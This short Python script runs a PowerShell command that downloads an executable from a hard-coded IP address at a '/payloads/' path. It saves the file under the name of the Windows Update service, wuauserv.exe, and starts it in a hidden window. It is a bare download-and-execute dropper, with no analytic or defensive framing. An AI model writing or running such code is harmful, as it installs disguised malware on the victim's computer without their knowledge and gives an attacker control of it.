import subprocess
cmd = "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://104.209.158.159:8080//payloads/windows/x86/wuauserv.exe','wuauserv.exe');Start-Process -WindowStyle Hidden wuauserv.exe"
subprocess.run(cmd)